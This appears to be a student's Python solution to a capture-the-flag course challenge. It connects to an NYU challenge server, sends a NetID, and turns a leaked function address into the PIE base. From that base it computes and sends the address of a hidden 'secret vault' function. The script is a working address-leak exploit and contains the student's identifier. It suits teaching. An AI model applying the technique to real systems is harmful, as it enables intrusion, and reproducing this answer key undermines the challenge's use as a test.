import socket
import struct

def recv_until(s, delimiter):
    data = b""
    while not data.endswith(delimiter):
        data += s.recv(1)
    return data

def connect_and_solve():
    host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
    port = 1245

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Receive prompt for NetID
    netid_prompt = recv_until(s, b'Please input your NetID (something like abc123): ')
    print(netid_prompt.decode())

    # Send NetID
    s.sendall(b'sb9156\n')

    # Receive the post-it note message
    post_it_note = recv_until(s, b'I found the raw bytes address of `totally_uninteresting_function` written somewhere: ')
    print(post_it_note.decode())

    # Receive the fake vault address in raw bytes (6 bytes)
    fake_vault_address_raw = s.recv(6)

    # Pad the 6 bytes to 8 bytes (little-endian format)
    fake_vault_padded_address = fake_vault_address_raw.ljust(8, b'\x00')
    tuf_offset = 0x1249
    add_offset = 0x1285                                      #fake vault offset obtained using greadelf command
    base_address = (struct.unpack("<Q", fake_vault_padded_address)[0]) - tuf_offset
    add_address = base_address + add_offset
    #print(f'Base address (hex): {hex(base_address)}')

    # Add the secret vault offset
    
    # Convert the secret vault address to raw bytes (little-endian format)
    secret_vault_address_bytes = struct.pack("<Q", add_address)

    # Send the raw bytes of the secret vault address
    s.sendall(secret_vault_address_bytes)


    # Receive and print the response
    while True:
        response = s.recv(1024)
        if not response:
            break
        print(response.decode(), end='')

    # Close the connection
    s.close()

if __name__ == "__main__":
    connect_and_solve()
